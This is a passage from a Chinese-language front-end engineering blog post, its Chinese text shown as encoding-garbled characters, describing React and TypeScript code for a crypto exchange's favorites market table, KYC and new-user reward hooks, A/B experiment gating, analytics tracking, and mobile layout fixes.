      <span class="hljs-attr">isCollected</span>: collectState.<span class="hljs-title function_">includes</span>(<span class="hljs-title function_">normalizeTradingPair</span>(item.<span class="hljs-property">symbolName</span>))  <span class="hljs-comment">// æ”¶è—çŠ¶æ€</span>
    }));
  }, [spot, contract, tabValue, marketType, collectState]);

  <span class="hljs-comment">// åˆ†é¡µå¤„ç†</span>
  <span class="hljs-keyword">const</span> paginatedData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> filteredList?.<span class="hljs-title function_">slice</span>((currentPage - <span class="hljs-number">1</span>) * <span class="hljs-number">6</span>, currentPage * <span class="hljs-number">6</span>) || [];
  }, [filteredList, currentPage]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.tableWrapper}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Trading Pair<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Price<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>24h Change<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>24h Volume<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
          {paginatedData.map(row =&gt; (
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{row.id}</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.pairCell}</span>&gt;</span>
                  {/* æ˜Ÿæ ‡å›¾æ ‡ */}
                  <span class="hljs-tag">&lt;<span class="hljs-name">Tooltip</span> <span class="hljs-attr">title</span>=<span class="hljs-string">{row.isCollected</span> ? '<span class="hljs-attr">Remove</span> <span class="hljs-attr">from</span> <span class="hljs-attr">Favorites</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">Add</span> <span class="hljs-attr">to</span> <span class="hljs-attr">Favorites</span>'}&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
                      <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.starIcon}</span>
                      <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> clickCollect(row, marketType)}
                    &gt;
                      {row.isCollected ? <span class="hljs-tag">&lt;<span class="hljs-name">StarFilled</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">StarOutlined</span> /&gt;</span>}
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                  <span class="hljs-tag">&lt;/<span class="hljs-name">Tooltip</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{row.icon}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{row.tradingPair}</span> /&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{row.tradingPair}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{row.price}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{row.change24h</span> &gt;</span>= 0 ? styles.positive : styles.negative}&gt;
                {row.change24h}%
              <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{row.volume24h}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">href</span>=<span class="hljs-string">{row.link}</span>&gt;</span>Trade<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
          ))}
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>

      {/* åˆ†é¡µå™¨ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Pagination</span>
        <span class="hljs-attr">current</span>=<span class="hljs-string">{currentPage}</span>
        <span class="hljs-attr">total</span>=<span class="hljs-string">{filteredList?.length</span> || <span class="hljs-attr">0</span>}
        <span class="hljs-attr">pageSize</span>=<span class="hljs-string">{6}</span>
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setCurrentPage}</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>æ˜Ÿæ ‡æ ·å¼ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.starIcon</span> {
  <span class="hljs-attribute">cursor</span>: pointer;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">8px</span>;

  <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.2</span>);
    <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.2s</span>;
  }

  <span class="hljs-comment">// é»„è‰²æ˜Ÿæ ‡ï¼ˆå·²æ”¶è—ï¼‰</span>
  :<span class="hljs-selector-tag">global</span>(.anticon-star) {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#FFD700</span>;
  }

  <span class="hljs-comment">// ç°è‰²æ˜Ÿæ ‡ï¼ˆæœªæ”¶è—ï¼‰</span>
  :<span class="hljs-selector-tag">global</span>(.anticon-star-outlined) {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#8C8C8C</span>;
  }
}
</code></pre>
<h4 data-id="heading-8">2.3 API æ¥å£å®ç°</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// /api/favorites.ts </span>

<span class="hljs-comment">// è·å–æ”¶è—åˆ—è¡¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getCollectInfo</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/member/preferences'</span>);
};

<span class="hljs-comment">// æ›´æ–°æ”¶è—åˆ—è¡¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateCollectInfo</span> = (<span class="hljs-params">data: {
  upsert_keys: {
    deriatives: <span class="hljs-built_in">string</span>;      // <span class="hljs-string">"BTC,ETH,SOL"</span>
    spotBookSymbolSequence: <span class="hljs-built_in">string</span>;  // <span class="hljs-string">"BTCUSDT,ETHUSDT,SOLUSDT"</span>
  }
}</span>) =&gt; {
  <span class="hljs-keyword">return</span> api.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/member/pref-setting'</span>, data);
};
</code></pre>
<h4 data-id="heading-9">2.4 æ–°æ‰‹ä»»åŠ¡å¥–åŠ±é›†æˆ</h4>
<p><strong>è‡ªå®šä¹‰ Hook: useNewbieTaskRewards</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// /hooks/useNewbieTaskRewards.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useNewbieTaskRewards</span> = (<span class="hljs-params">taskType: <span class="hljs-string">'kyc'</span> | <span class="hljs-string">'deposit'</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> [taskData, setTaskData] = useState&lt;<span class="hljs-title class_">TaskData</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> tagId = taskType === <span class="hljs-string">'kyc'</span> ? <span class="hljs-string">'Gifts_Kyc'</span> : <span class="hljs-string">'Gifts_deposit'</span>;

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchTask</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {<span class="hljs-comment">//...è·å–æ¥å£æ•°æ®,å¾—åˆ°æ–°æ‰‹ä»»åŠ¡çš„å¥–åŠ±é‡‘é¢,æ—¶æ•ˆç­‰};</span>

    <span class="hljs-title function_">fetchTask</span>();
  }, [tagId]);

  <span class="hljs-keyword">return</span> taskData;
};
</code></pre>
<p><strong>å€’è®¡æ—¶ç»„ä»¶ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">//components/CountdownTimer/index.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CountdownTimer</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;{ <span class="hljs-attr">seconds</span>: <span class="hljs-built_in">number</span> }&gt; = <span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">CountdownTimer</span>(<span class="hljs-params">{ seconds }</span>) {
  <span class="hljs-keyword">const</span> [timeLeft, setTimeLeft] = <span class="hljs-title function_">useState</span>(seconds);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (timeLeft &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">setTimeLeft</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, prev - <span class="hljs-number">1</span>));
    }, <span class="hljs-number">1000</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);
  }, [timeLeft]);

  <span class="hljs-keyword">const</span> days = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(timeLeft / <span class="hljs-number">86400</span>);
  <span class="hljs-keyword">const</span> hours = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((timeLeft % <span class="hljs-number">86400</span>) / <span class="hljs-number">3600</span>);
  <span class="hljs-keyword">const</span> minutes = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((timeLeft % <span class="hljs-number">3600</span>) / <span class="hljs-number">60</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.countdown}</span>&gt;</span>
      {days}d {hours}h {minutes}m remaining
    <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  );
});
</code></pre>
<h4 data-id="heading-10">2.5 KYC çŠ¶æ€ç»†åŒ–</h4>
<p><strong>è‡ªå®šä¹‰ Hook: useKycStatus</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// /hooks/useKycStatus.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">KycSubTaskStatus</span> {
  <span class="hljs-variable constant_">UNVERIFIED_ALL</span> = <span class="hljs-string">'3'</span>,      <span class="hljs-comment">// æœªè®¤è¯-å…¨éƒ¨</span>
  <span class="hljs-variable constant_">PASSED</span> = <span class="hljs-string">'2'</span>,              <span class="hljs-comment">// å·²é€šè¿‡</span>
  <span class="hljs-variable constant_">REVIEWING</span> = <span class="hljs-string">'1'</span>,           <span class="hljs-comment">// å®¡æ ¸ä¸­</span>
 <span class="hljs-comment">//..å…¶ä»–KYCçŠ¶æ€(éƒ¨åˆ†æœªè®¤è¯ã€æ‹’ç»å¯é‡è¯•ç­‰ç­‰)</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useKycStatus</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [status, setStatus] = useState&lt;<span class="hljs-title class_">KycSubTaskStatus</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> [kycLevel, setKycLevel] = useState&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchKycStatus</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-comment">//è·å–ç”¨æˆ·çš„KYCçŠ¶æ€</span>
    };

    <span class="hljs-title function_">fetchKycStatus</span>();
  }, []);

  <span class="hljs-comment">// çŠ¶æ€æ–‡æ¡ˆæ˜ å°„</span>
  <span class="hljs-keyword">const</span> statusTextMap = {
    [<span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">REVIEWING</span>]: <span class="hljs-string">'Your KYC is being reviewed'</span>,
    [<span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">UNVERIFIED_ALL</span>]: <span class="hljs-string">'Verify your identity'</span>,
    [<span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">PASSED</span>]: <span class="hljs-string">'KYC verified'</span>
    <span class="hljs-comment">//...</span>
  };

  <span class="hljs-keyword">return</span> {
    status,
    kycLevel,
    <span class="hljs-attr">statusText</span>: statusTextMap[status] || <span class="hljs-string">''</span>,
    <span class="hljs-attr">isReviewing</span>: status === <span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">REVIEWING</span>
  };
};
</code></pre>
<h4 data-id="heading-11">2.6 AB å®éªŒæ§åˆ¶</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// /Guides/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">Guides</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { verified, isDeposit } = <span class="hljs-title function_">useNewMypageContext</span>();
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">status</span>: kycStatus } = <span class="hljs-title function_">useKycStatus</span>();

  <span class="hljs-comment">// AB å®éªŒåˆ†ç»„</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">abResult</span>: showKycState } = <span class="hljs-title function_">useSensors</span>({
    <span class="hljs-attr">param_name</span>: <span class="hljs-string">'showKycState'</span>,
    <span class="hljs-attr">default_value</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 0=å¯¹ç…§ç»„ï¼Œ1=å®éªŒç»„</span>
    <span class="hljs-attr">value_type</span>: <span class="hljs-string">'Number'</span>
  });

  <span class="hljs-keyword">const</span> { <span class="hljs-attr">abResult</span>: showRewards } = <span class="hljs-title function_">useSensors</span>({
    <span class="hljs-attr">param_name</span>: <span class="hljs-string">'showRewards'</span>,
    <span class="hljs-attr">default_value</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 0=ä¸æ˜¾ç¤ºå¥–åŠ±ï¼Œ1=æ˜¾ç¤ºå¥–åŠ±</span>
    <span class="hljs-attr">value_type</span>: <span class="hljs-string">'Number'</span>
  });

  <span class="hljs-comment">// æœª KYC çŠ¶æ€</span>
  <span class="hljs-keyword">if</span> (!verified) {
    <span class="hljs-keyword">if</span> (showKycState === <span class="hljs-number">1</span> &amp;&amp; kycStatus !== <span class="hljs-title class_">KycSubTaskStatus</span>.<span class="hljs-property">UNVERIFIED_ALL</span>) {
      <span class="hljs-comment">// å®éªŒç»„ï¼šæ˜¾ç¤ºè¯¦ç»† KYC çŠ¶æ€</span>
      <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">EnhancedKycGuide</span> <span class="hljs-attr">status</span>=<span class="hljs-string">{kycStatus}</span> <span class="hljs-attr">showRewards</span>=<span class="hljs-string">{showRewards</span> === <span class="hljs-string">1}</span> /&gt;</span></span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// å¯¹ç…§ç»„ï¼šæ˜¾ç¤ºåŸæœ‰ UI</span>
      <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LegacyKycGuide</span> /&gt;</span></span>;
    }
  }

  <span class="hljs-comment">// å·² KYC ä½†æœªå……å€¼</span>
  <span class="hljs-keyword">if</span> (verified &amp;&amp; !isDeposit) {
    <span class="hljs-keyword">return</span> showRewards === <span class="hljs-number">1</span> ? (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">DepositGuideWithRewards</span> /&gt;</span></span>
    ) : (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LegacyDepositGuide</span> /&gt;</span></span>
    );
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
};
</code></pre>
<h3 data-id="heading-12">ä¸‰ã€åŸ‹ç‚¹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Favorites åŒºåŸŸæ›å…‰</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (tabValue === <span class="hljs-string">'favorites'</span>) {
    track?.(<span class="hljs-string">'PageView'</span>, {
      <span class="hljs-attr">section_type</span>: <span class="hljs-string">'Markets'</span>,
      <span class="hljs-attr">page_type</span>: <span class="hljs-string">'favorites'</span>,
    });
  }
}, [tabValue, collectState]);

<span class="hljs-comment">// ç‚¹å‡»æ·»åŠ /åˆ é™¤æ”¶è—</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClickStar</span> = (<span class="hljs-params">item</span>) =&gt; {
  track?.(<span class="hljs-string">'PageClick'</span>, {
    <span class="hljs-attr">section_type</span>: <span class="hljs-string">'Markets'</span>,
    <span class="hljs-attr">button_name</span>: item.<span class="hljs-property">isCollected</span> ? <span class="hljs-string">'Remove_from_Favorites'</span> : <span class="hljs-string">'Add_to_Favorites'</span>,
  });
};
</code></pre>
<h3 data-id="heading-13">å››ã€å“åº”å¼è®¾è®¡ä¸ H5 é€‚é…</h3>
<h4 data-id="heading-14">4.1 PC ç«¯å®ç°</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// PCMyPage/Markets/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">Markets</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">MarketDataProvider</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.marketsContainer}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">SegmentedControl</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setValue}</span> <span class="hljs-attr">options</span>=<span class="hljs-string">{marketOptions}</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Tabs</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{tabValue}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setTabValue}</span> <span class="hljs-attr">tabs</span>=<span class="hljs-string">{tabsList}</span> /&gt;</span>
        {isEmpty ? (
          <span class="hljs-tag">&lt;<span class="hljs-name">NoFavorites</span> <span class="hljs-attr">marketType</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">onAddToFavorites</span>=<span class="hljs-string">{handleAdd}</span> /&gt;</span>
        ) : (
          <span class="hljs-tag">&lt;<span class="hljs-name">MarketDataTable</span> <span class="hljs-attr">marketType</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">tabValue</span>=<span class="hljs-string">{tabValue}</span> /&gt;</span>
        )}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">MarketDataProvider</span>&gt;</span></span>
  );
};
</code></pre>
<h4 data-id="heading-15">4.2 H5 ç«¯é€‚é…</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// /H5MyPage/Markets/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">H5Markets</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// H5 ç«¯ä¸ä½¿ç”¨ Contextï¼Œç›´æ¥è°ƒç”¨ Hook</span>
  <span class="hljs-keyword">const</span> marketData = <span class="hljs-title function_">useMarket</span>({ <span class="hljs-comment">/* ... */</span> });
  <span class="hljs-keyword">const</span> { spotCollectState, contractCollectState } = <span class="hljs-title function_">useCollect</span>();

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.h5MarketsContainer}</span>&gt;</span>
      {/* å•åˆ—å¸ƒå±€ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">MobileSegmentedControl</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setValue}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">MobileTabs</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{tabValue}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setTabValue}</span> /&gt;</span>
      {isEmpty ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">NoFavorites</span> <span class="hljs-attr">marketType</span>=<span class="hljs-string">{value}</span> /&gt;</span>  {/* Grid è‡ªåŠ¨å˜ä¸ºå•åˆ— */}
      ) : (
        <span class="hljs-tag">&lt;<span class="hljs-name">MobileMarketDataTable</span> <span class="hljs-attr">marketType</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">tabValue</span>=<span class="hljs-string">{tabValue}</span> /&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>H5 æ ·å¼é€‚é…ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// H5MyPage/Markets/index.module.less</span>
<span class="hljs-selector-class">.h5MarketsContainer</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;

  <span class="hljs-selector-class">.grid</span> {
    <span class="hljs-attribute">display</span>: grid;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr;  <span class="hljs-comment">// å•åˆ—</span>
    <span class="hljs-attribute">gap</span>: <span class="hljs-number">12px</span>;
  }

  <span class="hljs-selector-class">.table</span> {
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;  <span class="hljs-comment">// PC ç«¯ 16px</span>

    <span class="hljs-selector-tag">td</span> {
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span>;  <span class="hljs-comment">// PC ç«¯ 12px</span>
    }
  }
}
</code></pre>
<h3 data-id="heading-16">äº”ã€æŠ€æœ¯éš¾ç‚¹ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-17">é—®é¢˜2: Icon åœ¨æµ‹è¯•ç¯å¢ƒï¼ˆU1ï¼‰æ— æ³•æ˜¾ç¤º</h4>
<p><strong>ç°è±¡ï¼š</strong></p>
<ul>
<li>ç”Ÿäº§ç¯å¢ƒå›¾ç‰‡æ­£å¸¸æ˜¾ç¤º</li>
<li>U1 æµ‹è¯•ç¯å¢ƒå›¾ç‰‡è¿”å› 404</li>
</ul>
<p><strong>æ ¹å› åˆ†æï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šç¡¬ç¼–ç  CDN åŸŸå</span>
<span class="hljs-keyword">const</span> iconUrl = <span class="hljs-string">`https://cdn.exchange.com/images/<span class="hljs-subst">${item.icon}</span>`</span>;
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šç¯å¢ƒå˜é‡åŠ¨æ€é…ç½®</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getCdnUrl</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> envMap = {
    <span class="hljs-string">'unify-test-1'</span>: <span class="hljs-string">'https://cdn-test.exchange.com'</span>,
    <span class="hljs-string">'gtd-test-1'</span>: <span class="hljs-string">'https://cdn-gtd-test.exchange.com'</span>,
    <span class="hljs-string">'production'</span>: <span class="hljs-string">'https://cdn.exchange.com'</span>
  };
  <span class="hljs-keyword">return</span> envMap[process.<span class="hljs-property">env</span>.<span class="hljs-property">PIPELINE_ENV</span>] || envMap.<span class="hljs-property">production</span>;
};

<span class="hljs-keyword">const</span> iconUrl = <span class="hljs-string">`<span class="hljs-subst">${getCdnUrl()}</span>/images/<span class="hljs-subst">${item.icon}</span>`</span>;
</code></pre>
<h4 data-id="heading-18">é—®é¢˜3: æ”¶è—ç«‹å³æ¶ˆå¤±å½±å“ç”¨æˆ·ä½“éªŒ</h4>
<p><strong>éœ€æ±‚ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·ç‚¹å‡»å–æ¶ˆæ”¶è—åï¼Œä¸è¦ç«‹å³ä»åˆ—è¡¨ä¸­ç§»é™¤</li>
<li>ç­‰ä¸‹æ¬¡åˆ‡æ¢ Tab æˆ–åˆ·æ–°é¡µé¢æ—¶å†åŒæ­¥</li>
</ul>
<p><strong>å®ç°æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> [pendingUnfavorites, setPendingUnfavorites] = useState&lt;<span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());

<span class="hljs-comment">// ç‚¹å‡»å–æ¶ˆæ”¶è—æ—¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUnfavorite</span> = (<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-comment">// 1. æ·»åŠ åˆ°å¾…ç§»é™¤åˆ—è¡¨ï¼ˆç”¨äºè§†è§‰åé¦ˆï¼‰</span>
  <span class="hljs-title function_">setPendingUnfavorites</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(prev).<span class="hljs-title function_">add</span>(id));

  <span class="hljs-comment">// 2. è°ƒç”¨ APIï¼ˆå¼‚æ­¥ï¼‰</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">clickCollect</span>(item, marketType);

  <span class="hljs-comment">// 3. ä¸ç«‹å³ä» collectState ä¸­ç§»é™¤</span>
};

<span class="hljs-comment">// æ¸²æŸ“æ—¶è¿‡æ»¤å¾…ç§»é™¤é¡¹ï¼ˆè§†è§‰ä¸Šæ¶ˆå¤±ï¼‰</span>
<span class="hljs-keyword">const</span> displayList = filteredList.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> 
  !pendingUnfavorites.<span class="hljs-title function_">has</span>(<span class="hljs-title function_">normalizeTradingPair</span>(item.<span class="hljs-property">tradingPair</span>))
);

<span class="hljs-comment">// åˆ‡æ¢ Tab æ—¶åˆ·æ–°æ•°æ®</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (tabValue === <span class="hljs-string">'favorites'</span>) {
    <span class="hljs-title function_">refreshCollectInfo</span>();  <span class="hljs-comment">// åŒæ­¥æœåŠ¡ç«¯æ•°æ®</span>
    <span class="hljs-title function_">setPendingUnfavorites</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());  <span class="hljs-comment">// æ¸…ç©ºå¾…ç§»é™¤åˆ—è¡¨</span>
  }
}, [tabValue]);
</code></pre>
<h4 data-id="heading-19">é—®é¢˜4: æ–°æ‰‹ä»»åŠ¡è¿‡æœŸåˆ¤æ–­ä¸å‡†ç¡®</h4>
<p><strong>ç°è±¡ï¼š</strong></p>
<ul>
<li>æœåŠ¡ç«¯æœªåŠæ—¶æ¸…ç†è¿‡æœŸä»»åŠ¡</li>
